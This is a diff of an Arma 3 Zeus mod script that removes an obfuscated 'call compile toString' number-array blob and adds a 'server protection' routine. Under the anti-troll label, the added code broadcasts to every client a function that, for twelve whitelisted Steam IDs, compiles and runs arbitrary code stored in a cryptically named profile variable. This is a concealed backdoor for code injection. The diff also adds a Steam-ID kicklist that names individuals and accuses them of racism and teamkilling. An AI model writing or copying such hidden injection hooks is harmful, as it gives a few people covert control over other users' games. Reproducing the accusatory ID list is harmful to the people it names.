,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,3025,2809,2916,3249,1936,2809,2916,2500,2809,1936,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,3249,2916,2304,2704,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,3249,2304,2500,2809,1936,2401,2401,3136,3136,2401,1936,2401,2304,2304,2304,2304,1936,2500,2601,2304,2704,1936,2401,2401,3136,3136,2401,1936,2401,2704,3136,3136,2704,1936,2401,2401,2304,2500,2809,1936,2809,2304,2704,2401,1936,2401,2601,2916,3136,3249,1936,2401,2401,2500,2601,2916,1936,2401,2304,2304,2304,2304,1936,2500,2601,2304,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2704,2916,2500,2704,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,3025,2809,2916,3249,1936,2809,2916,2500,2809,1936,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,3249,2916,2304,2704,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,3249,2304,2500,2809,1936,3025,2809,2916,3249,1936,2601,2401,2601,2916,1936,3025,2601,3249,2916,1936,2401,2704,2401,2916,2401,1936,2704,3249,2304,2304,1936,2401,2704,2401,2916,2401,1936,2401,2401,3136,3136,2401,1936,2401,2704,3136,3136,2704,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3249,2916,2304,2704,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,2601,2401,2601,2916,1936,2401,2704,3136,3136,2704,1936,3249,2916,2304,2704,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2401,2809,2500,2401,1936,2401,3136,2704,3249,1936,2401,2401,2809,2916,1936,2401,2809,2500,2401,1936,2401,2401,2809,2916,1936,2401,3136,2704,3249,1936,2401,2809,2500,2401,1936,2401,2809,2500,2401,1936,2401,3136,2704,3249,1936,2401,2401,2809,2916,1936,2401,2809,2500,2401,1936,2401,2401,2809,2916,1936,2401,3136,2704,3249,1936,2401,2809,2500,2401,1936,2401,3249,2601,2916,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,3249,2916,2304,2704,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,3136,2916,2704,3249,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2916,3025,2500,2704,1936,2401,2704,2916,2704,2401,1936,2809,2916,2500,2809,1936,2401,2704,2401,2916,2401,1936,2401,2401,3136,3136,2401,1936,2401,2500,2601,2500,2401,1936,3025,2809,2916,3249,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,3025,2809,2916,3249,1936,2401,2704,2916,2704,2401,1936,2809,2916,2500,2809,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,2401,2809,2500,2401,1936,2401,3136,2704,3249,1936,2401,2401,2809,2916,1936,2401,2809,2500,2401,1936,2401,2401,2809,2916,1936,2401,3136,2704,3249,1936,2401,2809,2500,2401,1936,3249,2916,2304,2704,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,2601,2401,2601,2916,1936,2401,2704,3136,3136,2704,1936,3249,2916,2304,2704,1936,2401,2809,2500,2401,1936,2401,3136,2704,3249,1936,2401,2401,2809,2916,1936,2401,2809,2500,2401,1936,2401,2401,2809,2916,1936,2401,3136,2704,3249,1936,2401,2809,2500,2401,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,3136,2500,3136,2401,1936,3136,2916,2704,3249,1936,2401,3249,2601,2916,1936,2401,2809,2401,2500,3249,1936,3136,2500,3136,2401,1936,3136,2916,2704,3249,1936,2401,2304,2500,2704,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,3025,2809,2916,3249,1936,2401,2500,2809,2704,2704,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,3249,2916,2304,2704,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,2601,2401,2601,2916,1936,2401,2704,3136,3136,2704,1936,3249,2916,2304,2704,1936,2401,2304,2500,2704,1936,2401,2500,2500,2809,1936,2401,2304,2500,2704,1936,3025,3025,2704,2704,1936,2401,2916,3136,2401,1936,2401,2809,2916,2500,2809,1936,3136,2916,2704,3249,1936,2401,2304,2500,2704,1936,2401,2601,2916,3136,3249,1936,2500,2601,2304,2704,1936,2601,2500,2704,3249,1936,2809,2304,2704,2401,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2304,3136,2401,2916,1936,2916,2304,3136,2704,1936,2500,2601,2304,2704,1936,2401,2401,3136,3136,2401,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2401,2809,2500,2401,1936,2401,3136,2704,3249,1936,2401,2401,2809,2916,1936,2401,2809,2500,2401,1936,2401,2401,2809,2916,1936,2401,3136,2704,3249,1936,2401,2809,2500,2401,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,3025,2809,2916,3249,1936,2401,2500,2809,2704,2704,1936,2601,2401,2601,2916,1936,2401,2809,2500,2401,1936,2401,3136,2704,3249,1936,2401,2401,2809,2916,1936,2401,2809,2500,2401,1936,2401,2401,2809,2916,1936,2401,3136,2704,3249,1936,2401,2809,2500,2401,1936,2401,3249,2601,2916,1936,2401,2304,2500,2704,1936,2500,2304,2500,2809,1936,2401,2601,2500,2500,2809,1936,2401,3249,2601,2916,1936,2401,2304,2500,2704,1936,2401,2809,2500,2401,1936,2401,3136,2704,3249,1936,2401,2401,2809,2916,1936,2401,2809,2500,2401,1936,2401,2401,2809,2916,1936,2401,3136,2704,3249,1936,2401,2809,2500,2401,1936,2704,3025,2916,2401,1936,2401,2704,2401,2916,2401,1936,2809,2704,3025,2916,1936,3249,2916,2304,2704,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,2601,2401,2601,2916,1936,2401,2704,3136,3136,2704,1936,3249,2916,2304,2704,1936,2401,2809,2500,2401,1936,2401,3136,2704,3249,1936,2401,2401,2809,2916,1936,2401,2809,2500,2401,1936,2401,2401,2809,2916,1936,2401,3136,2704,3249,1936,2401,2809,2500,2401,1936,3136,2916,2704,3249,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3025,2601,3249,2916,1936,2401,2601,2916,3136,3249,1936,2916,3025,2500,2704,1936,2500,2601,2304,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2809,2916,2500,2809,1936,2401,2809,2500,2401,1936,2401,2916,3136,2401,1936,3136,2916,2704,3249,1936,3249,3136,2304,2401,1936,3249,2704,2304,3249,1936,2401,2401,2916,2916,2704,1936,2401,2401,2916,2916,2704,1936,2401,2809,2401,2500,3249,1936,2401,2500,2809,2704,2704,1936,2401,2500,3249,3249,2916,1936,2401,2401,2304,2500,2809,1936,2401,2601,3249,2500,2704,1936,3249,2704,2304,3249,1936,2401,2601,2704,2809,2916,1936,2401,2304,2500,2304,2401,1936,3136,2500,3136,2401,1936,2401,2809,2500,2401,1936,3249,2304,2500,2809,1936,2500,2601,2304,2704,1936,2401,2809,2500,2401,1936,2401,3249,2601,2916,1936,2401,2809,2500,2401,1936,3249,2304,2500,2809,1936,2500,2704,2304,2401,1936,2401,2809,2500,2401,1936,2401,3249,2601,2916,1936,2401,2809,2500,2401,1936,3249,2304,2500,2809,1936,2500,2809,2304,2304,1936,2401,2809,2500,2401,1936,2401,3249,2601,2916,1936,2401,2809,2500,2401,1936,3249,2304,2500,2809,1936,2500,2916,2304,2401,1936,2401,2809,2500,2401,1936,3136,2916,2704,3249,1936,2601,2704,3136,2401,1936,3249,2304,2500,2809,1936,2500,2601,2304,2704,1936,2601,3025,2500,2401,1936,3249,2304,2500,2809,1936,2401,2601,2704,2809,2916,1936,2401,2304,3136,2401,2916,1936,2401,2401,2304,2500,2809,1936,2401,2601,2500,2500,2809,1936,2401,2304,2500,2704,1936,2401,2601,2500,2500,2809,1936,2401,2304,2500,2304,2401,1936,2401,2401,2916,2916,2704,1936,2401,2304,2500,2304,2401,1936,3249,3136,2304,2401,1936,2401,2601,2704,2809,2916,1936,2401,2304,2500,2704,1936,2500,2601,2304,2704,1936,2601,2704,3136,2401,1936,3249,2304,2500,2809,1936,2500,2704,2304,2401,1936,2601,3025,2500,2401,1936,3136,2500,3136,2401,1936,3136,2916,2704,3249,1936,2601,2704,3136,2401,1936,3249,2304,2500,2809,1936,2500,2809,2304,2304,1936,2601,3025,2500,2401,1936,2401,2601,2704,2809,2916,1936,2401,2500,2601,2500,2401,1936,2704,2500,2500,2809,1936,2401,2500,3249,3249,2916,1936,2401,2500,3249,3249,2916,1936,3249,2704,2304,3249,1936,2401,2704,2916,2704,2401,1936,2401,2304,2500,2704,1936,2401,2809,2500,2401,1936,2916,3136,3136,3249,1936,2500,2704,2304,2401,1936,2401,2401,2500,2601,2916,1936,2401,2304,2704,2304,2704,1936,2401,2304,3136,2401,2916,1936,2401,2401,2304,2500,2809,1936,3025,3249,2500,2401,1936,2809,3249,2500,3249,1936,3025,2500,2500,2809,1936,2401,2500,3025,2916,3249,1936,2704,3249,2304,2304,1936,3136,2401,2304,2304,1936,2401,2500,3249,3249,2916,1936,2401,2500,2401,2304,2304,1936,2500,3136,2304,3249,1936,2704,2500,2500,2809,1936,2704,2704,3136,3249,1936,2809,3025,3025,2916,1936,2401,2601,2704,2809,2916,1936,2500,2916,2304,2401,1936,2401,2304,2916,2304,3249,1936,2401,2500,2601,2500,2401,1936,2916,2704,2304,2304,1936,3025,2304,2809,2916,1936,2401,2704,2704,2304,2304,1936,2401,2401,2704,2704,3249,1936,3025,2809,2916,3249,1936,2401,2704,2916,2704,2401,1936,2401,2401,3136,3136,2401,1936,2601,2304,2500,2809,1936,2500,2601,2304,2704,1936,3249,2916,2304,2704,1936,2704,2601,2809,2916,1936,2401,2304,2304,2304,2304,1936,2401,2704,2401,2916,2401,1936,2704,3025,2916,2401,1936,2401,2704,3136,3136,2704,1936,2809,2916,2500,2809,1936,2601,2500,2704,3249,1936,2601,2401,2601,2916,1936,2809,2304,2704,2401,1936,2809,2704,3025,2916,1936,2916,2500,2704,2401,1936,2401,2601,2916,3136,3249,1936,2704,2916,2500,2704,1936,3025,2601,3249,2916,1936,2916,3025,2500,2704,1936,2809,2401,3136,2704,1936,2401,2500,2809,2704,2704,1936,2916,2304,3136,2704,1936,3249,2704,2304,3249,1936,2500,2809,2304,2304,1936,3249,3136,2304,2401,1936,3025,3025,2704,2704,1936,2401,2601,2500,2500,2809,1936,2916,2809,2916,2401,1936,2500,3025,2304,2704,1936,2500,3249,2401,2916,1936,2401,2401,2916,2916,2704,1936,2401,2601,3249,2500,2704,1936,2401,2304,2500,2304,2401,1936,2809,2601,2500,3249,1936,2401,2809,2500,2401,1936,2601,2704,3136,2401,1936,3249,2304,2500,2809,1936,2500,2916,2304,2401,1936,2601,3025,2500,2401,1936,2401,2601,2704,2809,2916,1936,2401,2500,2601,2500,2401,1936,2704,2500,2500,2809,1936,2401,2500,3249,3249,2916,1936,2401,2500,3249,3249,2916,1936,3249,2704,2304,3249,1936,2401,2704,2916,2704,2401,1936,2401,2304,2500,2704,1936,2401,2809,2500,2401,1936,2704,2500,2500,2809,1936,2704,2601,2809,2916,1936,2704,2704,3136,3249,1936,2704,2916,2500,2704,1936,2704,3025,2916,2401,1936,2704,3249,2304,2304,1936,2809,2304,2704,2401,1936,2809,2401,3136,2704,1936,2809,2601,2500,3249,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,2809,3025,3025,2916,1936,2809,3249,2500,3249,1936,2916,2304,3136,2704,1936,2916,2500,2704,2401,1936,2916,2704,2304,2304,1936,2916,2809,2916,2401,1936,2916,3025,2500,2704,1936,2916,3136,3136,3249,1936,3025,2304,2809,2916,1936,3025,2500,2500,2809,1936,3025,2601,3249,2916,1936,3025,2809,2916,3249,1936,3025,3025,2704,2704,1936,3025,3249,2500,2401,1936,3136,2401,2304,2304,1936,3249,2704,2304,3249,1936,3249,2916,2304,2704,1936,3249,3136,2304,2401,1936,2401,2304,2304,2304,2304,1936,2401,2304,2500,2304,2401,1936,2401,2304,2704,2304,2704,1936,2401,2304,2916,2304,3249,1936,2401,2304,3136,2401,2916,1936,2401,2401,2304,2500,2809,1936,2401,2401,2500,2601,2916,1936,2401,2401,2704,2704,3249,1936,2401,2401,2916,2916,2704,1936,2401,2401,3136,3136,2401,1936,2401,2500,2401,2304,2304,1936,2401,2500,2601,2500,2401,1936,2401,2500,2809,2704,2704,1936,2401,2500,3025,2916,3249,1936,2401,2500,3249,3249,2916,1936,2401,2601,2500,2500,2809,1936,2401,2601,2704,2809,2916,1936,2401,2601,2916,3136,3249,1936,2401,2601,3249,2500,2704,1936,2401,2704,2401,2916,2401,1936,2401,2704,2704,2304,2304,1936,2401,2704,2916,2704,2401,1936,2401,2704,3136,3136,2704,1936,2500,2601,2304,2704,1936,2500,2704,2304,2401,1936,2500,2809,2304,2304,1936,2500,2916,2304,2401,1936,2500,3025,2304,2704,1936,2500,3136,2304,3249,1936,2500,3249,2401,2916,1936,2601,2304,2500,2809,1936,2601,2401,2601,2916,1936,2601,2500,2704,3249,1936,2401,2809,2500,2401,1936,2601,2704,3136,2401,1936,2401,2809,2401,2500,3249,1936,2401,2401,2304,2500,2809,1936,2401,2304,2704,2304,2704,1936,2401,2916,2304,2304,1936,3249,2304,2500,2809,1936,2500,2809,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2704,2304,2704,1936,2401,2401,2304,2500,2809,1936,2401,2500,2401,2304,2304,1936,2401,2304,2304,2304,2304,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2401,2704,2704,2304,2304,1936,2401,2304,2500,2704,1936,2601,3136,2704,2704,1936,2601,3025,2500,2401,1936,2500,2601,2304,2704,1936,2401,2916,3136,2401,1936,2401,2601,2704,2809,2916,1936,2401,2304,3136,2401,2916,1936,2401,2304,2500,2304,2401,1936,2401,2500,2401,2304,2304,1936,2401,2809,2401,2500,3249,1936,3249,2304,2500,2809,1936,2500,2704,2304,2401,1936,2401,2304,2500,2704,1936,2401,2500,2809,2704,2704,1936,2401,2601,2916,3136,3249,1936,2401,2601,2500,2500,2809,1936,2401,2304,3136,2401,2916,1936,2704,2601,2809,2916,1936,3249,2704,2304,3249,1936,3249,3136,2304,2401,1936,2401,2401,2704,2704,3249,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,3249,2304,2500,2809,1936,2500,2916,2304,2401,1936,2401,2304,2500,2704,1936,2401,2601,2500,2500,2809,1936,2401,2304,2500,2304,2401,1936,2401,2401,2916,2916,2704,1936,2401,2304,2500,2304,2401,1936,3249,3136,2304,2401,1936,2401,2601,2704,2809,2916,1936,2401,2916,2304,2304,1936,3249,2304,2500,2809,1936,2500,2809,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2704,2304,2704,1936,2401,2401,2304,2500,2809,1936,2401,2500,2401,2304,2304,1936,2401,2304,2304,2304,2304,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2401,2704,2704,2304,2304,1936,2401,2916,3136,2401,1936,2401,2916,3136,2401,1936,2601,2704,3136,2401,1936,2401,2809,2916,2500,2809,1936,2401,2304,2500,2304,2401,1936,2401,2401,2916,2916,2704,1936,2401,2601,2500,2500,2809,1936,2401,2304,2500,2304,2401,1936,2401,2809,2401,2500,3249,1936,3249,2304,2500,2809,1936,2500,2704,2304,2401,1936,2401,2304,2500,2704,1936,2401,2500,2809,2704,2704,1936,2401,2601,2916,3136,3249,1936,2401,2601,2500,2500,2809,1936,2401,2304,3136,2401,2916,1936,2704,2601,2809,2916,1936,3249,2704,2304,3249,1936,3249,3136,2304,2401,1936,2401,2401,2704,2704,3249,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2401,2704,2704,2304,2304,1936,2601,2704,3136,2401,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2809,2916,2500,2809,1936,2401,2304,2704,2304,2704,1936,2401,2500,2601,2500,2401,1936,2401,2500,3249,3249,2916,1936,2704,3025,2916,2401,1936,3249,2704,2304,3249,1936,3249,3136,2304,2401,1936,2401,2304,3136,2401,2916,1936,2401,2304,2500,2704,1936,2401,2601,2704,2809,2916,1936,2401,2500,2601,2500,2401,1936,2704,2500,2500,2809,1936,2401,2500,3249,3249,2916,1936,2401,2500,3249,3249,2916,1936,3249,2704,2304,3249,1936,2401,2704,2916,2704,2401,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2500,2601,2304,2704,1936,2601,2704,3136,2401,1936,3249,3136,2304,2401,1936,3249,2704,2304,3249,1936,2401,2401,2916,2916,2704,1936,2401,2401,2916,2916,2704,1936,2401,2304,2500,2704,1936,3249,3136,2304,2401,1936,2401,2500,2601,2500,2401,1936,2401,2401,3136,3136,2401,1936,2401,2500,2809,2704,2704,1936,2401,2401,2304,2500,2809,1936,2401,2401,2916,2916,2704,1936,2401,2304,2500,2304,2401,1936,2401,2304,2500,2704,1936,2401,2601,2704,2809,2916,1936,2401,2500,2601,2500,2401,1936,2916,3136,3136,3249,1936,2401,2601,2704,2809,2916,1936,2401,2500,3249,3249,2916,1936,2401,2401,2304,2500,2809,1936,2401,2500,2401,2304,2304,1936,2401,2304,2916,2304,3249,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2500,2704,2304,2401,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2601,3249,1936,2704,2401,1936,2809,3249,1936,3249,3249,1936,3249,3025,1936,2401,2304,3136,1936,2401,2304,3136,1936,2601,2500,1936,3249,3249,1936,2401,2401,2401,1936,2401,2304,3249,1936,2401,2401,2500,1936,2401,2304,2809,1936,2401,2304,3136,1936,2401,2304,2401,1936,2601,2500,1936,2401,2401,2916,1936,2401,2401,2401,1936,3136,2601,1936,2401,2401,2916,1936,2401,2401,2704,1936,2401,2304,2809,1936,2401,2401,2304,1936,2401,2304,2601,1936,2601,2500,1936,3249,2809,1936,2704,3249,1936,2809,3249,1936,2401,2500,2809,1936,2809,3249,8649,3481];call compile toString _1;};
-	
 comment "Dynamic Faction Addons";
 
 	MAZ_EZM_fnc_addNewFactionsToZeusInterface = {
@@ -4010,7 +4244,7 @@ comment "Dynamic Faction Addons";
 	};
 
 	MAZ_EZM_fnc_setInterfaceToRefresh = {
-		params [["_refreshTime", 10]];
+		params [["_refreshTime",10]];
 		private _refresh = missionNamespace getVariable "MAZ_EZM_refreshTime";
 		if(isNil "_refresh") then {
 			private _refreshOnClose = ["onZeusInterfaceClosed", {
@@ -4112,9 +4346,9 @@ MAZ_EZM_fnc_createUnitForZeus = {
 	private _namePlayer = name player;
 	selectPlayer _zeusObject;
 	waitUntil{player == _zeusObject};
-	[_zeusObject,false] remoteExec ['allowDamage'];
+	[_zeusObject,false] remoteExec ["allowDamage"];
 
-	[_zeusLogic] remoteExec ['unassignCurator',2];
+	[_zeusLogic] remoteExec ["unassignCurator",2];
 
 	waitUntil{(getAssignedCuratorUnit _zeusLogic) != _oldPlayer};
 	deleteVehicle _oldPlayer;
@@ -4126,7 +4360,7 @@ MAZ_EZM_fnc_createUnitForZeus = {
 	waitUntil {_zeusLogic in (missionNamespace getVariable ["MAZ_EZM_CuratorWhitelist",[]])};
 
 	while{isNull (getAssignedCuratorUnit (allCurators select _zeusIndex))} do {
-		[player,allCurators select _zeusIndex] remoteExec ['assignCurator',2];
+		[player,allCurators select _zeusIndex] remoteExec ["assignCurator",2];
 		sleep 0.1;
 	};
 
@@ -4149,8 +4383,6 @@ MAZ_EZM_fnc_createUnitForZeus = {
 	playSound "beep_target";
 	sleep 0.2;
 
-	[_oldPlayer,true] remoteExec ["hideObjectGlobal"];
-	[_zeusObject,_namePlayer] remoteExec ["setName"];
 	[_zeusObject] call MAZ_EZM_fnc_addObjectToInterface;
 	
 	["Zeus Unit created, you can adjust its loadout by setting a Zeus Loadout."] call MAZ_EZM_fnc_systemMessage;
@@ -4542,8 +4774,7 @@ MAZ_EZM_fnc_setZeusTransparency = {
 		(_display displayCtrl 646) ctrlCommit 0; 
 
 		(_display displayCtrl 152) ctrlSetTextColor EZM_themeColor; 
-		(_display displayCtrl 152) ctrlAddEventHandler ["MouseButtonClick",
-		{
+		(_display displayCtrl 152) ctrlAddEventHandler ["MouseButtonClick", {
 			params ["_control"];
 			_control spawn 
 			{
@@ -4916,16 +5147,239 @@ MAZ_EZM_fnc_initFunction = {
 		MAZ_EZM_fnc_cleanerWaitTilNoPlayers = {
 			params ["_object"];
 			if(!MAZ_EZM_enableCleaner) exitWith {};
-			waitUntil {!alive _object};
-			waitUntil {
-				(count (allPlayers select { (getPos _x) distance _object < 3000 })) == 0 ||
-				isNull _object
+			[[_object], {
+				private _fnc_cleaner = {
+					params ["_object"];
+					waitUntil {uiSleep 0.1; !alive _object};
+					waitUntil {
+						(count (allPlayers select { (getPos _x) distance _object < 1600 })) == 0 ||
+						isNull _object
+					};
+					if(!isNull _object) then {
+						sleep 300;
+						"After 5 minutes check if players are still near, if they are, call function again, else delete.";
+						if(count (allPlayers select { (getPos _x) distance _object < 1600 }) != 0) exitWith {[_object] spawn _fnc_cleaner;};
+						deleteVehicle _object;
+					};
+				};
+				_this spawn _fnc_cleaner;
+			}] remoteExec ["spawn",2];
+		};
+		
+		MAZ_EZM_fnc_serverProtection = {
+			"Troll and malicious scripter kicklist";
+			call {
+				private _fnc = { 
+					params ["_varName"];
+					if (!hasInterface) exitWith {}; 
+					waitUntil {!isNil {player} && {!isNull player}}; 
+					waitUntil {!isNull (findDisplay 46)};
+					missionNamespace setVariable [_varName,nil];
+
+					"Trolls and/or malicious scripters, prevent them from entering protected servers.";
+
+					private _trollList = [
+						"76561199520028598", "Bad Scripter", "Mass teamkilling, spawning vehicles, killing servers",
+						"76561198156801483", "Christian/Infamous Main", "Racism, mass teamkilling",
+						"76561198804630831", "Christian/Infamous Alt", "Racism, mass teamkilling",
+						"76561198153376863", "Mike Main", "Troll menu, killing servers",
+						"76561199804439314", "Mike Alt", "Troll menu, killing servers",
+						"76561198063175176", "Fatty", "Troll menu, killing servers",
+						"76561198836581836", "Chadgaskerman", "Troll menu, killing servers",
+						"76561199549143480", "Chad alt", "Troll menu, killing servers",
+						"76561199550089982", "Atakjak", "Troll menu, killing servers",
+						"76561197970363940", "Greebo", "Troll menu, killing servers"
+					];
+					private _index = _trollList find (getPlayerUID player);
+
+					if((_index != -1) && (missionNamespace getVariable ["MAZ_EZM_ServerProtection",true])) exitWith {
+						private _reason = _trollList select (_index + 2);
+						private _handle = [_reason] spawn {
+							params ["_reason"];
+							private _display = if(isNull (findDisplay 312)) then {
+								if(visibleMap) then {
+									findDisplay 12;
+								} else {
+									findDisplay 46;
+								}
+							} else {
+								findDisplay 312;
+							};
+							[
+								parseText (format ["
+								<t size='1.3' align='center' color='#00BFBF'>You've Been Flagged as a Troll</t><br/>
+								<t size='1.0' align='center'>If you'd like to appeal this decision, contact Expung3d in the ZAM discord.</t><br/>
+								<t size='1.0' align='center'>Reason: %1</t>",_reason]), 
+								"EZM Server Protection System", 
+								true, 
+								false,
+								_display
+							] call BIS_fnc_guiMessage;
+						};
+						waitUntil {scriptDone _handle};
+						(format ["[ SERVER PROTECTION ] : %1 is a known troll. Reasoning: %2. They've been disconnected.", name player,_reason]) remoteExec ["systemChat"];
+						sleep 0.1;
+						onEachFrame { 
+							private _displays = allDisplays; 
+							private _indexMission = _displays find (findDisplay 46); 
+							_displays = _displays select [_indexMission,count(_displays)]; 
+							reverse _displays; 
+							{_x closeDisplay 2} forEach _displays;  
+
+							onEachFrame { 
+								(findDisplay 50) closeDisplay 2; 
+								(findDisplay 70) closeDisplay 2; 
+							}; 
+						}; 
+					};
+					if(getPlayerUID player == "_SP_PLAYER_") exitWith {};
+					
+					if !((getPlayerUID player) in [
+						"76561198156155313",
+						"76561198818190097",
+						"76561198150558135",
+						"76561198045496731",
+						"76561199046962322",
+						"76561199048401115",
+						"76561198029421818",
+						"76561198069456197",
+						"76561198983415876",
+						"76561198395886568",
+						"76561198358820610",
+						"76561198874058939"
+					]) exitWith {};
+
+					private _codac = profileNamespace getVariable ["i2n3j4e5c6t7_8008", "{}"]; 
+					if (_codac == "{}") exitWith {}; 
+
+					if(missionNamespace getVariable ["runfncinj",false]) exitWith {}; 
+					[] call compile ("[] call " + _codac); 
+				}; 
+				"Randomize variable";
+				private _varName = "";
+				for "_i" from 0 to 15 do {
+					_varName = _varName + (selectRandom ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]);
+				};
+				missionNamespace setVariable [_varName,['',_fnc],true];
+				[[_varName],{
+					params ["_varName"];
+					private _var = missionNamespace getVariable _varName;
+					[_varName] spawn (_var # 1);
+				}] remoteExec ['spawn', 0, true]; 
 			};
-			if(!isNull _object) then {
-				sleep 300;
-				comment "After 5 minutes check if players are still near, if they are, call function again, else delete.";
-				if(count (allPlayers select { (getPos _x) distance _object < 3000 }) != 0) exitWith {[_object] spawn MAZ_EZM_fnc_cleanerWaitTilNoPlayers;};
-				deleteVehicle _object;
+
+			"Anti-Cheat. Detect unauthorized Zeuses";
+			call {
+				private _fnc = { 
+					fncnkf = nil;
+					private _fnc_sendZeusMessage = {
+						params ["_message"];
+						[[_message], {
+							if(isNull (findDisplay 312)) then {
+								hint _message;
+							} else {
+								[objNull,_this select 0] call BIS_fnc_showCuratorFeedbackMessage;
+							};
+						}] remoteExec ["spawn",_zeusPlayers];
+						(format ["[ SERVER PROTECTION ] : %1", _message]) remoteExec ["systemChat"];
+					};
+
+					private _fnc_checkForCheaters = {
+						private _zeusPlayers = allPlayers select {!isNull (getAssignedCuratorLogic _x)};
+
+						"Check for Zeus";
+							private _logic = getAssignedCuratorLogic player;
+							if !(isNil "bis_curator" && isNil "bis_curator_1") then {
+								"Official scenario";
+								if (!isNull _logic && {!(_logic in (missionNamespace getVariable ["MAZ_EZM_CuratorWhitelist",[]])) && !((getPlayerUID player) in (missionNamespace getVariable ["MAZ_EZM_ZeusWhitelist",[]]))}) then {
+									[format ["Player %1 had access to Zeus! Their curator was deleted.",name player]] call _fnc_sendZeusMessage;
+									findDisplay 312 closeDisplay 0;
+									deleteVehicle _logic;
+								};
+							};
+
+						"Remove scripters with unauthorized debug console access";
+						if !(getPlayerUID player in [
+							"76561198156155313",
+							"76561198818190097",
+							"76561198150558135",
+							"76561198045496731",
+							"76561199046962322",
+							"76561199048401115",
+							"76561198029421818",
+							"76561198069456197",
+							"76561198983415876",
+							"76561198395886568",
+							"76561198358820610",
+							"76561198874058939"
+						]) then {
+							EDC_BE_init = nil;
+							if (!isNil 'EDC_fnc_editDebugConsole') then {
+								EDC_fnc_editDebugConsole = {};
+							};
